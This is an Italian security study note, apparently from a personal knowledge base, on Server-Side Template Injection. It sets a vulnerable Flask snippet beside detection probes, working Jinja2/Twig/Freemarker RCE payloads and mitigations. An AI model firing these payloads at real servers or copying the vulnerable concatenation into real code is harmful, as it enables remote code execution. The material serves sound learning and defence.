---
tipo: concetto
tag: [web, owasp]
fase: 3
fonti: 3
aggiornato: 2026-06-21
stato: maturo
aliases: ["Server-Side Template Injection (SSTI)", "SSTI"]
---

# Server-Side Template Injection (SSTI)

> **Nota etica**: testare solo su lab autorizzati (PortSwigger, CTF, TryHackMe).

## In breve
La **SSTI** avviene quando l'input utente viene inserito **come parte del template** server (Jinja2, Twig, Freemarker, Velocity, ERB) ed eseguito dal motore. Poiché i template eseguono codice, la SSTI porta spesso a **RCE**. Categoria **A03 Injection** dell'[[OWASP Top 10]]. Tipico in funzioni di personalizzazione (email, saluti, profili).

## Codice vulnerabile
```python
# Flask/Jinja2 — input concatenato NEL template (≠ passato come variabile)
return render_template_string("Ciao " + request.args.get("name"))
```

## Metodologia (PortSwigger): detect → identify → exploit
**1. Detect** con un'espressione matematica:
```
{{7*7}}   → 49   (Jinja2/Twig)
${7*7}    → 49   (Freemarker/Velocity, Java)
#{7*7}    → 49   (Ruby ERB con #{})
<%= 7*7 %> → 49  (ERB)
```
**2. Identify** il motore: invia payload polyglot `${{<%[%'"}}%\` e osserva l'errore; oppure prova sintassi specifiche (`{{7*'7'}}` → `7777777` in Jinja2, `49` in Twig).

**3. Exploit** verso RCE.

## Esempi RCE
```jinja
{# Jinja2 #}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```
```
{# Twig (PHP) #}
{{ ['id'] | filter('system') }}
{# Freemarker (Java) #}
<#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }
```
Da qui → [[Reverse Shell e Bind Shell]]. **tplmap** automatizza detection ed exploit.

## SSTI vs XSS
`{{7*7}}` che diventa `49` = **SSTI** (esecuzione server). Se l'input torna **letterale** ma interpretato dal browser → è [[Cross-Site Scripting (XSS)]] (client). Test rapido per distinguere: l'espressione matematica viene **calcolata**?

## Mitigazione (priorità)
1. **Mai concatenare** input nel template: passalo come **variabile di contesto** (`render_template("t.html", name=name)`).
2. Motore in **sandbox** (es. Jinja2 `SandboxedEnvironment`) — utile ma bypassabile, non unica difesa.
3. Template **logic-less** (Mustache) dove il contenuto utente non può essere codice.
4. Minimo privilegio per contenere l'RCE.

## Collegamenti
- [[OWASP Top 10]]
- [[Command Injection]]
- [[Cross-Site Scripting (XSS)]]
- [[Reverse Shell e Bind Shell]]
- [[Burp Suite]]

## Fonti
- PortSwigger — Server-side template injection: https://portswigger.net/web-security/server-side-template-injection
- OWASP WSTG — Testing for SSTI: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- PayloadsAllTheThings — SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
